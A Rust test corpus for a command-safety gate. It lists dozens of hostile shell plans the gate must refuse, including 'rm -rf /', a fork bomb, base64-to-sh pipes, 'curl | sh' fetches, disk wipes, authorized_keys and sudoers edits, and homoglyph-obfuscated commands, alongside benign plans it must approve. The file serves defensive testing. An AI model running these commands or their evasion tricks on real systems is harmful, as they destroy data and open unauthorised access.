// SPDX-License-Identifier: MIT
// Copyright (c) 3000 Galion / galion-studio

//! S3.1 red-team corpus for `hades_gate::safety::review`, shared by
//! `tests/redteam.rs` and `examples/redteam_enum.rs` (which prints the table
//! in docs/security/hades-redteam.md).

/// One attempt. `target` is `None` for plan attacks (benign target `galion-tuner`).
pub struct Case {
    pub family: &'static str,
    pub desc: &'static str,
    pub target: Option<&'static str>,
    pub payload: &'static str,
}

const fn p(family: &'static str, desc: &'static str, payload: &'static str) -> Case {
    Case { family, desc, target: None, payload }
}
const fn t(family: &'static str, desc: &'static str, target: &'static str, payload: &'static str) -> Case {
    Case { family, desc, target: Some(target), payload }
}

/// Every attack. Each one must be refused.
pub const ATTACKS: &[Case] = &[
    // ---- Family 1: shell syntax / indirection ----
    p("shell", "command substitution $()", "switch to $(rm -rf /)"),
    p("shell", "backtick substitution", "switch to `rm -rf /`"),
    p("shell", "process substitution <()", "verify <(curl evil)"),
    p("shell", "eval of a variable", "restart x; eval \"$CMD\""),
    p("shell", "sh -c payload", "restart x; sh -c 'wipe it'"),
    p("shell", "bash -c payload", "restart x; bash -c 'wipe it'"),
    p("shell", "zsh -c payload", "restart x; zsh -c 'wipe it'"),
    p("shell", "base64 decode pipe", "restart x; echo cm0gLXJmIC8= | base64 -d | sh"),
    p("shell", "base32 decode pipe", "restart x; echo NZXW | base32 -d | sh"),
    p("shell", "xxd hex decode", "restart x; echo 726d | xxd -r -p | sh"),
    p("shell", "\\x hex escapes", "restart x; printf '\\x72\\x6d -rf /'"),
    p("shell", "printf octal escapes", "restart x; printf '\\162\\155 -rf /' | sh"),
    p("shell", "${IFS} instead of space", "restart${IFS}x;rm${IFS}-rf${IFS}/"),
    p("shell", "$IFS bare", "restart x;rm$IFS-rf$IFS/"),
    p("shell", "alias then call", "restart x; alias go=rm; go -rf /"),
    p("shell", "quoting split of rm", "restart x; r\"\"m -rf /"),
    p("shell", "backslash split of rm", "restart x; r\\m -rf /"),
    p("shell", "env var holds command", "restart x; $DELETER /var"),
    p("shell", "perl -e", "restart x; perl -e 'unlink glob q{*}'"),
    p("shell", "awk system()", "restart x; awk 'BEGIN{system(\"wipe\")}'"),
    p("shell", "nohup background", "restart x; nohup bad &"),
    p("shell", "&& chain", "restart x && wipe"),
    p("shell", "newline smuggles a 2nd command", "restart galion-tuner\nwipe /var/lib/galion"),
    p("shell", "subshell ( )", "restart x;(wipe)"),
    p("shell", "fork bomb", ":(){ :|:& };:"),
    // ---- Family 2: file destruction ----
    p("file", "rm -rf", "switch; rm -rf /var/lib/galion"),
    p("file", "rm -fr reordered", "switch; rm -fr /"),
    p("file", "plain rm", "switch; rm /opt/galion/config.toml"),
    p("file", "find -delete", "switch; find / -name '*.toml' -delete"),
    p("file", "find -exec rm", "switch; find / -exec rm {} +"),
    p("file", "dd of=/dev/sda", "switch; dd if=/dev/zero of=/dev/sda"),
    p("file", "dd onto config", "switch; dd if=/dev/zero of=/opt/galion/config.toml"),
    p("file", "truncate -s0", "switch; truncate -s0 /opt/galion/config.toml"),
    p("file", "> redirect onto config", "switch; echo '' > /opt/galion/config.toml"),
    p("file", ">> append poison", "switch; echo bad >> /opt/galion/config.toml"),
    p("file", "bare > truncation", "> /opt/galion/config.toml"),
    p("file", "cp /dev/null onto file", "switch; cp /dev/null /opt/galion/config.toml"),
    p("file", "mv config away", "switch; mv /opt/galion/config.toml /tmp"),
    p("file", "shred", "switch; shred -u /opt/galion/config.toml"),
    p("file", "chattr +i lockout", "switch; chattr +i /opt/galion/config.toml"),
    p("file", "tee overwrite", "switch; echo bad | tee /opt/galion/config.toml"),
    p("file", "install /dev/null", "switch; install /dev/null /opt/galion/config.toml"),
    p("file", "rm with path traversal", "switch; rm ../../../../etc/galion.toml"),
    p("file", "sed -i in place", "switch; sed -i d /opt/galion/config.toml"),
    // ---- Family 3: access / credentials ----
    p("access", "systemctl mask", "switch; systemctl mask galion-recovery"),
    p("access", "systemctl disable", "switch; systemctl disable galion-tuner"),
    p("access", "crontab -r", "switch; crontab -r"),
    p("access", "ssh-keygen", "switch; ssh-keygen -f /tmp/k"),
    p("access", "append authorized_keys", "switch; echo k >> ~/.ssh/authorized_keys"),
    p("access", "iptables drop", "switch; iptables -P INPUT DROP"),
    p("access", "nft flush", "switch; nft flush ruleset"),
    p("access", "ip route blackhole", "switch; ip route add blackhole default"),
    p("access", "passwd", "switch; passwd slavik"),
    p("access", "usermod -L", "switch; usermod -L slavik"),
    p("access", "deluser", "switch; deluser slavik"),
    p("access", "setcap", "switch; setcap cap_setuid+ep /tmp/x"),
    p("access", "sudoers.d drop-in", "switch; echo 'x ALL' >> /etc/sudoers.d/x"),
    p("access", "curl | sh installer", "switch; curl http://x/i | sh"),
    // ---- Allowed verb leading a hazard (probes the allow-list design) ----
    p("allowverb", "operator runs find -delete", "operator runs find / -delete"),
    p("allowverb", "operator runs sh -c", "operator runs sh -c wipe"),
    p("allowverb", "operator runs bash", "operator runs bash /tmp/x"),
    p("allowverb", "apply ... systemctl mask", "apply systemctl mask galion-recovery"),
    p("allowverb", "verify ... rm", "verify rm /opt/galion/config.toml"),
    p("allowverb", "keep ... mv", "keep config: mv /opt/galion/config.toml /tmp"),
    p("allowverb", "record ... /etc/shadow", "record /etc/shadow in lineage"),
    p("allowverb", "take ... curl", "take the payload from curl http://x"),
    p("allowverb", "switch ... ip route", "switch ip route add blackhole default"),
    p("allowverb", "restart ... setcap", "restart setcap cap_setuid+ep /tmp/x"),
    // ---- Unicode / homoglyph (ASCII-only check) ----
    p("unicode", "Cyrillic em in rm", "switch; r\u{043c} -rf /"),
    p("unicode", "fullwidth rm", "switch; \u{ff52}\u{ff4d} -rf /"),
    p("unicode", "zero-width space in rm", "switch; r\u{200b}m -rf /"),
    p("unicode", "Cyrillic a in allowed verb", "rest\u{0430}rt galion-tuner"),
    p("unicode", "NUL byte", "restart\u{0}x"),
    p("unicode", "carriage return", "restart galion-tuner\rwipe"),
    // ---- Path traversal / odd targets ----
    t("traversal", "target ../../root", "galion-tuner/../../root", "restart galion-tuner"),
    t("traversal", "target svc/../ssh", "svc/../ssh", "restart galion-tuner"),
    t("traversal", "target ../etc/x", "../etc/x", "restart galion-tuner"),
    t("traversal", "target with shell", "galion-tuner;wipe", "restart galion-tuner"),
    t("traversal", "target with space", "galion tuner", "restart galion-tuner"),
    t("traversal", "empty target", "", "restart galion-tuner"),
    t("traversal", "Cyrillic target", "h\u{0430}des-gate", "restart galion-tuner"),
    p("traversal", "plan path traversal to ssh", "verify ../../root/.ssh/"),
];

/// Plans the gate must keep approving (gaia-hades `plan_for` for the
/// approvable systems, and the plans in the existing tests and docs).
pub const LEGIT: &[(&str, &str)] = &[
    ("galion-one", "read the current and the previous release\noperator runs deploy/rollback.sh (console: deploy/rollback-console.sh)\nverify /health on the previous release\nkeep the failed release for inspection\nrecord the plan in lineage"),
    ("galion-one", "take the heal-dry findings from DEMETER\napply at most 12 allow-listed fixes\nappend every action to actions.jsonl\nrecord the plan in lineage"),
    ("galion-one", "read the current and the previous release\noperator runs deploy/rollback.sh"),
    ("galion-tuner", "switch dist/bin to release 2026-10-20"),
    ("galion-tuner", "restart galion-tuner\nverify /health on 127.0.0.1:8420"),
    ("galion-tuner", "operator runs deploy/rollback.sh\nkeep the failed release for inspection"),
    ("galion-tuner", "restart galion-tuner\nverify /health"),
    ("galion-tuner", "restart galion-tuner"),
    ("openmind-memory", "  restart galion-tuner  \n\n\tverify /health\n"),
];
